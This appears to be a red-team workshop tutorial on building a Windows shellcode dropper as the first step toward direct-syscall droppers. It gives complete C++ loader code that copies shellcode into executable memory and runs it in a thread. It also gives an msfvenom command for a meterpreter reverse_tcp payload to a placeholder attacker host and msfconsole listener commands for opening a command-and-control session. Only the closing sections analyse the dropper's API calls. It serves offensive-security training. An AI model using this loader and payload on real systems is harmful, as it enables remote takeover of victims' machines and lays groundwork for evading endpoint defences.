## Introduction
In this exercise, we want to take the first step towards creating our own direct system call dropper. But to understand the principle of a legitimate
sysall itself, we will start by creating a **high-level API shellcode dropper in short HLA-dropper** based on the Windows APIs which are loaded by the kernel32.dll, which will serve as a reference for later modifications. Which means, in the first step, I deliberately do not use native APIs or direct system calls yet, but start with the classic implementation via Windows APIs, which are obtained via the Kernel32.dll.

![high_level_dropper_principal](https://user-images.githubusercontent.com/50073731/235367776-54229a66-f1d6-4b8e-a2a2-7bb81fecbf48.png)



## Workshop tasks
1. Create a new C++ POC in Visual Studio 2019 and use the provided code for the HLA Dropper.
2. Create staged x64 meterpreter shellcode with msfvenom and copy it to the C++ HLA Dropper POC. 
3. Compile the HLA Dropper as release or debug x64 
4. Create and run a staged x64 meterpreter listener with msfconsole
5. Run your compiled .exe and verify that a stable command and control channel opens. 
6. Use the Visual Studio dumpbin tool to verify that all used Windows APIs are correctly imported by kernel32.dll. 
7. Use the API Monitor tool to check the transition from the used Windows APIs to the corresponding native APIs. 
8. Use x64 dbg and check where the syscall execution of each used native API comes from ? Module? Location? 



## Visual Studio 
The POC can be created as a new C++ project (Console Application) in Visual Studio by following the steps below. 

<p align="center">
<img width="652" alt="image" src="https://user-images.githubusercontent.com/50073731/235356344-c14f9123-751c-462c-a610-50c7156f93f9.png">
</p>

The easiest way is to create a new console app project and then replace the default hello world text in main.cpp with your code. 

<p align="center">
<img width="640" alt="image" src="https://user-images.githubusercontent.com/50073731/235357092-5fd2e873-6732-4b37-a69d-38a281953b2e.png">
<img width="645" alt="image" src="https://user-images.githubusercontent.com/50073731/235357228-940ec56c-7565-44b8-8b6a-01a74ab15e1d.png">
</p>

The technical functionality of the high level API is relatively simple and therefore, in my opinion, perfectly suited to gradually develop the high level API dropper into a direct system call dropper. In the HLA dropper we use the following Windows APIs: 
- VirtualAlloc
- WriteProcessMemory
- CreateThread
- WaitForSingleObject

The code works as follows. 

Within the main function, the variable "code" is defined, which is responsible for storing the shellcode. The content of "code" is stored in the .text (code) section of the PE structure or, if the shellcode is larger than 255 bytes, the shellcode is stored in the .rdata section.
<p align="center">
<img width="608" alt="image" src="https://user-images.githubusercontent.com/50073731/235367184-71a8dbb0-036b-4cc1-93d2-28ef1abfd9ef.png">
</p>    
    
The next step is to define a "void*" type pointer with the "exec" variable, which points to the Windows API VirtualAlloc and returns the start address of the allocated memory block.
<p align="center">
<img width="594" alt="image" src="https://user-images.githubusercontent.com/50073731/235367335-a08a4a78-8a5c-4e02-9523-7bf2d1032f1c.png">
</p>

Then, the Windows WriteProcessMemory API is used to copy the meterpreter shellcode into the allocated memory.
<p align="center">
<img width="611" alt="image" src="https://user-images.githubusercontent.com/50073731/235367362-359adc26-500b-4b9d-8d3b-a8aa32dd2b64.png">
</p>

The next step is to execute the shellcode by creating a new thread 
<p align="center">
<img width="615" alt="image" src="https://user-images.githubusercontent.com/50073731/235367381-48be952c-9d46-4859-8682-69ed717f4dd4.png">
</p>

We need to make sure that the shellcode thread completes its execution before the main thread exits.
<p align="center">
<img width="616" alt="image" src="https://user-images.githubusercontent.com/50073731/235367403-8bd2150f-eeb2-444c-b7ca-bf4c7ea39260.png">
</p>

Here is the complete code and you can copy this code to your high level API POC.

```
#include <stdio.h>
#include <windows.h>

// Define the thread function for executing shellcode
// This function will be executed in a separate thread created later in the main function
DWORD WINAPI ExecuteShellcode(LPVOID lpParam) {
    // Create a function pointer called 'shellcode' and initialize it with the address of the shellcode
    void (*shellcode)() = (void (*)())lpParam;

    // Call the shellcode function using the function pointer
    shellcode();

    // Return 0 as the thread exit code
    return 0;
}

int main() {
    // Insert the Meterpreter shellcode as an array of unsigned chars (replace the placeholder with actual shellcode)
    unsigned char code[] = "\xfc\x48\x83...";

    // Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
    // 'exec' will hold the base address of the allocated memory region
    void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // Copy the shellcode into the allocated memory region using WriteProcessMemory
    SIZE_T bytesWritten;
    WriteProcessMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);

    // Create a new thread to execute the shellcode
    // Pass the address of the ExecuteShellcode function as the thread function, and 'exec' as its parameter
    // The returned handle of the created thread is stored in hThread
    HANDLE hThread = CreateThread(NULL, 0, ExecuteShellcode, exec, 0, NULL);

    // Wait for the shellcode execution thread to finish executing
    // This ensures the main thread doesn't exit before the shellcode has finished running
    WaitForSingleObject(hThread, INFINITE);

    // Return 0 as the main function exit code
    return 0;
}
```


## Meterpreter Shellcode
In this step, we will create our shellcode for the high-level API dropper poc with msfvenom in Kali Linux. To do this, we use the following command and 
create x64 staged meterpreter shellcode.
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Kali LPORT=80 -f c > /tmp/shellcode.txt
```
<p align="center">
<img width="696" alt="image" src="https://user-images.githubusercontent.com/50073731/235358025-7267f8c6-918e-44e9-b767-90dbd9afd8da.png">
</p>

The shellcode can then be copied into the POC by replacing the placeholder at the unsigned char, and the POC can be compiled as a x64 release.
<p align="center">
<img width="596" alt="image" src="https://user-images.githubusercontent.com/50073731/235358159-c43053aa-9a35-4b4e-b627-001b112e6324.png">
</p>


## MSF-Listener
Before we test the functionality of our high-level API dropper, we need to create a listener within msfconsole.

**kali>**
```
msfconsole
```
**msf>**
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost IPv4_Redirector_or_IPv4_Kali
set lport 80 
set exitonsession false
run
```
<p align="center">
<img width="510" alt="image" src="https://user-images.githubusercontent.com/50073731/235358630-09f70617-5f6e-4f17-b366-131f8efe19d7.png">
</p>

Once the listener has been successfully started, you can run your compiled high_level_dropper.exe. If all goes well, you should see an incoming command and control session 

<p align="center">
<img width="658" alt="image" src="https://user-images.githubusercontent.com/50073731/235358750-df254ff2-0265-40b3-8e1f-edc7893ce2a1.png">
</p>



## HLA-Dropper analysis: Dumpbin tool
The Visual Studio Dumpbin tool can be used to check which Windows APIs are imported via Kernel32.dll. The following command can be used to check the imports.
**cmd>**
```
cd C:\Program Files (x86)\Microsoft Visual Studio\2019\Community
dumpbin /imports high_level.exe
```
In the case of the high-level API Dropper based on Windows APIs, you should see that the APIs used in the Dropper POC are imported into the dropper.exe by the kernel32.dll.

![image](https://user-images.githubusercontent.com/50073731/235368084-b0780c7e-3007-4efd-9b85-322f8ab854a2.png)


## HLA-Dropper analysis: API-Monitor
We use API Monitor to check the transition from the four used Windows APIs to the four corresponding native APIs.
For a correct check, it is necessary to filter to the correct APIs. Only by providing the correct Windows APIs and corresponding native APIs, which can prove the transition from Windows APIs (kernel32.dll) to native APIs (ntdll.dll), in the context of the High Level API Dropper, we filter on the following API calls:
- VirtualAlloc
- NtAllocateVirtualMemory
- WriteProcessMemory
- NtWriteVirtualMemory
- CreateThread
- NtCreateThreadEx
- WaitForSingleObject
- NtWaitForSingleObject

If everything was done correctly, you should see clean transitions from the Windows APIs used to the native APIs we used in our high-level Dropper POC.
![image](https://user-images.githubusercontent.com/50073731/235368426-41d5468a-d249-4f8f-bf61-76905e1c1c7e.png)



